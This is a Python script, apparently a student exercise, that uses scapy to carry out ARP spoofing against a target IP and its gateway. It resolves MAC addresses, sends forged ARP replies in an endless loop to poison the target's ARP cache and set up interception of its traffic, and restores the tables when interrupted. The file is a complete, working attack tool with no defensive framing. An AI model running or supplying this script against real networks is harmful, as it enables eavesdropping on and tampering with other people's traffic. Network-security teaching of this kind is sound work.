# -*- coding: utf-8 -*-
"""
Created on Wed Mar 29 23:13:17 2023

@author: 21030363
"""

import scapy.all as scapy
import time
import sys
import argparse


def get_ip():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target_ip", help="Specify the target's IP address")
    parser.add_argument("-g", "--gateway", dest="gateway_ip", help="Specify the gateway's IP address")
    options = parser.parse_args()
    
    if not options.target_ip:
        parser.error("[-] Specify an IP address for the target. --help for more info")
    elif not options.gateway_ip:
        parser.error("[-] Specify an IP address for the gateway, --help for more info")
    return options

def get_mac(ip):
    arp_header = scapy.ARP(pdst=ip)
    ether_header = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_packet = ether_header / arp_header
    answered_list = scapy.srp(arp_request_packet, timeout=5, verbose=False)[0]

    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        print("[-] Could not obtain MAC address for IP address: " + ip)
        return None

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    print('target-mac', target_mac)

    if target_mac:
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        scapy.send(packet, verbose=True)
    else:
        print("\n[-] Could not spoof IP address: " + target_ip + ", could not obtain MAC address")

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    print('source-mac', source_mac)

    if destination_mac and source_mac:
        packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
        scapy.send(packet, count=4, verbose=False)
    else:
        print("[-] Could not restore ARP tables for IP addresses: " + destination_ip + ", " + source_ip + ", could not obtain MAC address")

options = get_ip()

try:
    sent_packet_count = 0
    while True:
        spoof(options.target_ip, options.gateway_ip)
        sent_packet_count += 2
        print ("\r[+] Packet sent: " + str(sent_packet_count), end="")
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print ("\n[+] Detected CTRL + C ... Restoring ARP tables ... Please wait/")
    restore(options.target_ip, options.gateway_ip)
    restore(options.gateway_ip, options.target_ip)
    print("[+] ARP tables restored")
